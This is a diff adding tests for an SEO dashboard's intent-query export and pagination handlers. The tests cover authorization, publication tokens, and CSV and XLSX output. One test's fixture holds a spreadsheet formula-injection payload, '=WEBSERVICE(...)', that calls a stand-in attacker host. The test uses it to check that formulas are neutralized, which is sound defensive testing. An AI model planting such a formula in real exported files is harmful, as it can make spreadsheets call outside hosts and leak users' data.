@@ -3,7 +3,7 @@ import test from "node:test";
 import type { DatasetMeta, Period } from "@reportingdash/site-seo-contract";
 import * as XLSX from "xlsx";
 import { buildDashboardExportRows, buildExportRows, buildGscExportRows, toCsv } from "../src/lib/exports.ts";
-import { createExcelExportHandler, createPdfExportHandler } from "../src/lib/route-handlers.ts";
+import { createExcelExportHandler, createIntentQueryHandler, createPdfExportHandler, parseIntentQueryOptions } from "../src/lib/route-handlers.ts";
 import { createPeriodSelection } from "../src/lib/period-selection.ts";
 
 const period: Period = { kind: "iso_week", key: "2026-W01", from: "2025-12-29", to: "2026-01-04", sourceTimezone: "Europe/Moscow" };
@@ -127,6 +127,37 @@ test("exports actual Wordstat snapshot windows, Alice query sources, and publish
   assert.match(csv, /Позиция SEO OS: лечение рака.*позиция 4\.5.*дельта -2.*статус found.*URL https:\/\/example\.test\/diseases\/cancer\/.*checked 2026-01-09 10:00:00.*import seo-run-1/);
 });
 
+test("exports generic target-intent label, active provenance, matched rule and match type", () => {
+  const rows = buildDashboardExportRows({
+    profile: { sources: [] } as never,
+    selection,
+    model: {
+      gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} },
+      datasets: {},
+      targetIntent: {
+        siteId: "site-clinic", dashboardId: 77, versionId: "intent-version-9", label: "Запросы пациентов", state: "ready",
+        period, sources: [],
+        provenance: { importId: "91", publicationId: "92", sourceTransport: "google_sheet", sourceIdentity: "docs.google.com/spreadsheets/d/example", contentSha256: "b".repeat(64), publishedAt: "2026-09-15T13:00:00Z", publishedBy: "admin@example.test", comment: "approved" },
+        target: { label: "Запросы пациентов", impressions: 90, clicks: 9, sharePct: 90, queryCount: 1 },
+        other: { label: "Остальные запросы", impressions: 10, clicks: 1, sharePct: 10, queryCount: 1 },
+        queries: [
+          { query: "лечение", source: "google", impressions: 90, clicks: 9, category: "target", group: "Услуги", matchedRule: "лечение", matchType: "phrase" },
+          { query: "погода", source: "yandex", impressions: 10, clicks: 1, category: "other", group: null, matchedRule: null, matchType: null },
+        ],
+      },
+    },
+  } as never);
+  const text = rows.map((row) => `${row.field}: ${row.value}`).join("\n");
+  assert.match(text, /Целевой интент: 2025-12-29 — 2026-01-04/);
+  assert.match(text, /Метка целевого интента: Запросы пациентов/);
+  assert.match(text, /Активная версия правил: intent-version-9/);
+  assert.match(text, /Источник правил: google_sheet.*docs\.google\.com.*publication 92.*import 91.*SHA-256 b{64}/);
+  assert.match(text, /Запросы пациентов · показы: 90/);
+  assert.match(text, /лечение.*target.*правило лечение.*тип phrase.*группа Услуги/);
+  assert.match(text, /погода.*other.*правило не найдено.*тип нет/);
+  assert.doesNotMatch(text, /Медицинский интент|экспертного ядра|Шум/);
+});
+
 test("refuses an export session from another dashboard before any canonical read", async () => {
   let calls = 0;
   const response = await createExcelExportHandler({
@@ -194,4 +225,127 @@ test("reports an authorized Excel read failure as unavailable", async () => {
     execute: async () => { throw new Error("database unavailable"); },
   })(readRequest);
   assert.equal(response.status, 503);
+});
+
+test("bounds intent query pagination and rejects invalid categories and formats", () => {
+  assert.deepEqual(parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_page=999999&intent_page_size=999999&intent_format=json&intent_publication=92")), {
+    category: "target", page: 10_000, pageSize: 100, format: "json", expectedPublicationId: "92",
+  });
+  assert.throws(() => parseIntentQueryOptions(new URL("https://example.test?intent_category=noise")));
+  assert.throws(() => parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_format=pdf")));
+  assert.equal(parseIntentQueryOptions(new URL("https://example.test?intent_category=target")).expectedPublicationId, null);
+  assert.equal(parseIntentQueryOptions(new URL("https://example.test?intent_category=target&intent_publication=")).expectedPublicationId, null);
+});
+
+const intentModel = {
+  gsc: { meta, summary: null, daily: [], dimensions: [], dimensionMeta: {} }, indexing: meta, datasets: {}, metrika: null, webmaster: null, wordstat: null, alice: null, seoOs: null, trafficComparison: {},
+  targetIntent: {
+    siteId: "site-med", dashboardId: 42, versionId: "v9", label: "Запросы пациентов", state: "ready" as const, period,
+    provenance: { importId: "91", publicationId: "92", sourceTransport: "upload" as const, sourceIdentity: "rules.xlsx", contentSha256: "a".repeat(64), publishedAt: "2026-09-15T12:00:00Z", publishedBy: "admin@example.test", comment: null },
+    target: { label: "Запросы пациентов", impressions: 30, clicks: 3, sharePct: 75, queryCount: 2 }, other: { label: "Остальные запросы", impressions: 10, clicks: 1, sharePct: 25, queryCount: 1 }, sources: [],
+    queries: [
+      { query: "альфа", source: "google" as const, impressions: 20, clicks: 2, category: "target" as const, group: "А", matchedRule: "альфа", matchType: "exact" as const },
+      { query: "бета", source: "yandex" as const, impressions: 10, clicks: 1, category: "target" as const, group: "Б", matchedRule: "бета", matchType: "phrase" as const },
+      { query: "прочее", source: "google" as const, impressions: 10, clicks: 1, category: "other" as const, group: null, matchedRule: null, matchType: null },
+    ],
+  },
+};
+
+test("returns an authorized category page for the selected period and active publication", async () => {
+  const response = await createIntentQueryHandler({
+    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }),
+    execute: async () => { throw new Error("use injected model"); },
+  }, { loadModel: async () => intentModel as never })({ ...readRequest, intent: { category: "target", page: 1, pageSize: 1, format: "json", expectedPublicationId: "92" } });
+  assert.equal(response.status, 200);
+  assert.equal(response.headers.get("cache-control"), "private, no-store");
+  assert.deepEqual(await response.json(), {
+    category: "target", label: "Запросы пациентов", period, activePublicationId: "92", page: 1, pageSize: 1, totalRows: 2, totalPages: 2,
+    rows: [intentModel.targetIntent.queries[0]],
+  });
+});
+
+test("rejects stale publication tokens and foreign dashboard sessions before disclosure", async () => {
+  let reads = 0;
+  const dependencies = { registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer" as const, family: "site_seo" as const, dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); } };
+  const stale = await createIntentQueryHandler(dependencies, { loadModel: async () => { reads += 1; return intentModel as never; } })({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "old" } });
+  assert.equal(stale.status, 409);
+  assert.equal(reads, 1);
+
+  const unauthorized = await createIntentQueryHandler({ ...dependencies, getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 99, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }) }, { loadModel: async () => { reads += 1; return intentModel as never; } })({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
+  assert.equal(unauthorized.status, 401);
+  assert.equal(reads, 1);
+});
+
+test("requires omitted, empty, stale and valid publication tokens according to the loaded intent state", async () => {
+  const dependencies = { registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer" as const, family: "site_seo" as const, dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); } };
+  const handler = createIntentQueryHandler(dependencies, { loadModel: async () => intentModel as never });
+  const options = (query: string) => parseIntentQueryOptions(new URL(`https://example.test?intent_category=target${query}`));
+
+  for (const query of ["", "&intent_publication=", "&intent_publication=old"]) {
+    const response = await handler({ ...readRequest, intent: options(query) });
+    assert.equal(response.status, 409, query || "omitted");
+    assert.deepEqual(await response.json(), { error: "intent_publication_changed", activePublicationId: "92" });
+  }
+  assert.equal((await handler({ ...readRequest, intent: options("&intent_publication=92") })).status, 200);
+
+  for (const state of ["not_configured", "unavailable"] as const) {
+    const nonReady = { ...intentModel, targetIntent: { ...intentModel.targetIntent, state, provenance: null, versionId: null } };
+    const response = await createIntentQueryHandler(dependencies, { loadModel: async () => nonReady as never })({ ...readRequest, intent: options("") });
+    assert.equal(response.status, 503, state);
+    assert.deepEqual(await response.json(), { error: "intent_classification_unavailable" });
+  }
+});
+
+test("downloads only the requested category with review fields and active publication", async () => {
+  const handler = createIntentQueryHandler({
+    registration: { profile: { clientId: "client-med", dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
+  }, { loadModel: async () => intentModel as never });
+  const csvResponse = await handler({ ...readRequest, intent: { category: "other", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
+  const csv = await csvResponse.text();
+  assert.match(csv, /Активная публикация;92/);
+  assert.match(csv, /2025-12-29;2026-01-04/);
+  assert.match(csv, /прочее;Google;10;1;не найдено правило/);
+  assert.doesNotMatch(csv, /альфа|бета/);
+
+  const xlsxResponse = await handler({ ...readRequest, intent: { category: "target", page: 1, pageSize: 50, format: "xlsx", expectedPublicationId: "92" } });
+  assert.equal(xlsxResponse.headers.get("content-type"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
+  const workbook = XLSX.read(await xlsxResponse.arrayBuffer(), { type: "array" });
+  const rows = XLSX.utils.sheet_to_json<Record<string, string | number>>(workbook.Sheets[workbook.SheetNames[0]!]!);
+  assert.equal(rows[0]?.["Активная публикация"], "92");
+  assert.ok(rows.some((row) => row["Запрос"] === "альфа" && row["Тип совпадения"] === "точное"));
+  assert.ok(rows.every((row) => row["Запрос"] !== "прочее"));
+});
+
+test("neutralizes spreadsheet formulas in attacker-influenced CSV fields", async () => {
+  const maliciousModel = {
+    ...intentModel,
+    targetIntent: {
+      ...intentModel.targetIntent,
+      queries: [{ query: "=WEBSERVICE(\"https://attacker.invalid\")", source: "google" as const, impressions: 10, clicks: 1, category: "target" as const, group: "+cmd", matchedRule: "@rule", matchType: "exact" as const }],
+    },
+  };
+  const response = await createIntentQueryHandler({
+    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
+  }, { loadModel: async () => maliciousModel as never })({ ...readRequest, intent: { category: "target", page: 1, pageSize: 50, format: "csv", expectedPublicationId: "92" } });
+  const csv = await response.text();
+  assert.match(csv, /'=WEBSERVICE/);
+  assert.match(csv, /;'\+cmd;/);
+  assert.match(csv, /;'@rule;/);
+  assert.doesNotMatch(csv, /(?:^|;)=WEBSERVICE|(?:^|;)\+cmd|(?:^|;)@rule/m);
+});
+
+test("clamps an out-of-range JSON page to the last available page", async () => {
+  const response = await createIntentQueryHandler({
+    registration: { profile: { dashboardId: 42, siteId: "site-med", slug: "medroche", sources: [] } as never, bindings: [] }, credentialVersion: 1,
+    getSession: async () => ({ audience: "viewer", family: "site_seo", dashboardId: 42, siteId: "site-med", credentialVersion: 1, expiresAt: "2026-10-01T00:00:00Z" }), execute: async () => { throw new Error("unused"); },
+  }, { loadModel: async () => intentModel as never })({ ...readRequest, intent: { category: "target", page: 10_000, pageSize: 1, format: "json", expectedPublicationId: "92" } });
+  const body = await response.json();
+  assert.equal(body.page, 2);
+  assert.equal(body.totalPages, 2);
+  assert.deepEqual(body.rows, [intentModel.targetIntent.queries[1]]);
 });
